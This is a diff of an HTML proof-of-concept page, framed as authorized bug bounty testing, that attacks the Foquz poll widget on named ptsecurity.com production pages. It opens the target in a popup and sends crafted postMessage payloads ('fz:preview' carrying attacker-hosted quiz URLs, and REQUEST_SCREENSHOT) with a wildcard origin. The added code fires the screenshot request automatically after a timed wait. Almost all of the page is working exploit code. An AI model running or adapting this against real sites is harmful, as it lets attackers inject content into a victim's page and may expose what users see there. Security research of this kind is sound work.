@@ -1,85 +1,252 @@
 <!DOCTYPE html>
+
 <html lang="en">
+
 <head>
+
 <meta charset="utf-8">
+
 <title>Foquz fz:preview postMessage PoC</title>
+
 <style>
+
 body{font-family:monospace;max-width:900px;margin:20px auto;padding:0 10px;background:#111;color:#ddd}
+
 button{padding:10px 16px;margin:6px 4px;font-size:15px;cursor:pointer}
+
 pre{white-space:pre-wrap;border:1px solid #444;padding:10px;max-height:320px;overflow:auto;background:#181818}
+
 .log{border:1px solid #333;padding:8px;background:#181818;margin:8px 0}
+
 h3{color:#8f8}
+
 </style>
+
 </head>
+
 <body>
+
 <h2>Foquz widget — fz:preview postMessage PoC (authorized security testing)</h2>
+
 <p>Target: PT Security production pages (www.ptsecurity.com / global.ptsecurity.com).
+
 This page is an attacker-origin simulation used with permission under the
+
 Positive Technologies bug bounty program (Standoff365, researcher 1xayra).</p>
 
+
+
 <div class="log">
+
 <b>Step 1.</b> Click to open a PT page in popup (TEST A baseline: no preview).<br>
+
 <b>Step 2.</b> From this page send postMessage <code>{type:"fz:preview", config:{params:{quiz:"&lt;attacker-url&gt;"}}}</code> to the PT window.<br>
+
 <b>Step 3.</b> Observe on the PT page whether a preview modal/iframe opens with attacker-controlled src.
+
 </div>
 
+
+
 <label>PT target page:
+
 <select id="target">
+
+<option value="https://ptsecurity.com/products/" selected>https://ptsecurity.com/products/ (poll appears after 2-3 min)</option>
+
 <option value="https://www.ptsecurity.com/ru-ru/">https://www.ptsecurity.com/ru-ru/</option>
+
 <option value="https://global.ptsecurity.com/en/">https://global.ptsecurity.com/en/</option>
+
 </select>
+
 </label>
+
 <br>
+
+
 
 <label>Attacker URL #1 (TEST B):
+
 <input id="url1" size="45" value="https://elijah-boop228.github.io/poc-foquz/poc-page-1.html">
+
 </label>
+
 <br>
+
 <label>Attacker URL #2 (TEST C):
+
 <input id="url2" size="45" value="https://elijah-boop228.github.io/poc-foquz/poc-page-2.html">
+
 </label>
+
 <br>
+
+
 
 <button onclick="openTarget()">1) Open PT page (popup)</button>
+
 <button onclick="sendPreview(document.getElementById('url1').value)">2) TEST B: send fz:preview (url1)</button>
+
 <button onclick="sendPreview(document.getElementById('url2').value)">3) TEST C: send fz:preview (url2)</button>
+
 <button onclick="sendBenign()">4) TEST D control: benign message (no fz:preview type)</button>
+
 <button onclick="closeWin()">Close popup</button>
 
+
+
 <h3>Log</h3>
+
 <pre id="log">[ready] waiting for actions</pre>
 
+
+
 <script>
+
 let w = null;
+
 const logEl = document.getElementById('log');
+
 function log(m){ logEl.textContent += "\n" + new Date().toISOString().slice(11,19) + " | " + m; }
+
 function openTarget(){
+
   const t = document.getElementById('target').value;
+
   w = window.open(t, 'ptTarget');
+
   log("opened popup → " + t + " (same window reused for all tests)");
+
 }
+
 function sendPreview(url){
+
   if(!w || w.closed){ log("ERROR: open PT page first"); return; }
+
   const msg = { type: "fz:preview", config: { params: { quiz: url } } };
+
   // targetOrigin "*" — гипотеза: handler не проверяет origin, поэтому '*' достаточен;
+
   // если бы origin проверялся строго, сообщение с '*' всё равно дошло бы, но было бы проигнорировано
+
   w.postMessage(msg, "*");
+
   log("sent fz:preview → quiz=" + url + " | targetOrigin=*");
+
 }
+
 function sendBenign(){
+
   if(!w || w.closed){ log("ERROR: open PT page first"); return; }
+
   w.postMessage({ type: "some:unrelated:type", source: "foquz", config: { params: { quiz: "https://example.net/" } } }, "*");
+
   log("sent benign control message (unrelated type) — nothing should happen");
+
 }
+
 function closeWin(){ if(w){ w.close(); log("popup closed"); } }
 
+
+
 // приёмник: если PT-страница нам что-то ответит — залогируем
+
 window.addEventListener("message", function(ev){
+
   let d = ev.data;
+
   try { d = typeof d === "string" ? JSON.parse(d) : d; } catch(e){}
+
   log("recv from origin=" + ev.origin + " : " + JSON.stringify(d).slice(0,300));
+
 });
+
 log("PoC page loaded. attacker origin = " + location.origin);
+
+
+
+// === AUTO MODE + REQUEST_SCREENSHOT (добавлено для сценария "опрос через 2-3 мин") ===
+
+let ptWinRef = null;
+
+const _origOpen = openTarget;
+
+openTarget = function(){
+
+  _origOpen();
+
+  ptWinRef = window.open('', 'ptTarget'); // ref по имени
+
+};
+
+
+
+// TEST E: отправить REQUEST_SCREENSHOT в popup
+
+const btnE = document.createElement('button');
+
+btnE.innerText = '4) TEST E: send REQUEST_SCREENSHOT (after poll appears)';
+
+btnE.onclick = function(){
+
+  const w = window.open('', 'ptTarget');
+
+  if (!w || w.closed) { log('TEST E ERROR: popup lost'); return; }
+
+  w.postMessage(JSON.stringify({type:'REQUEST_SCREENSHOT'}), '*');
+
+  log('TEST E: REQUEST_SCREENSHOT sent');
+
+};
+
+document.body.appendChild(btnE);
+
+
+
+// AUTO: полностью автоматический сценарий
+
+const btnAuto = document.createElement('button');
+
+btnAuto.innerText = '5) AUTO: open products, wait 170s, auto-send REQUEST_SCREENSHOT';
+
+btnAuto.onclick = function(){
+
+  log('AUTO: opening popup...');
+
+  openTarget();
+
+  log('AUTO: waiting 170 seconds for poll widget to appear...');
+
+  setTimeout(function(){
+
+    const w = window.open('', 'ptTarget');
+
+    if (!w || w.closed) { log('AUTO ERROR: popup lost'); return; }
+
+    w.postMessage(JSON.stringify({type:'REQUEST_SCREENSHOT'}), '*');
+
+    log('AUTO: REQUEST_SCREENSHOT sent at t=170s');
+
+    // повтор через 10 сек на случай тайминга
+
+    setTimeout(function(){
+
+      try { w.postMessage(JSON.stringify({type:'REQUEST_SCREENSHOT'}), '*'); log('AUTO: retry sent at t=180s'); } catch(e){}
+
+    }, 10000);
+
+  }, 170000);
+
+};
+
+document.body.appendChild(btnAuto);
+
+
+
 </script>
+
 </body>
+
 </html>
+
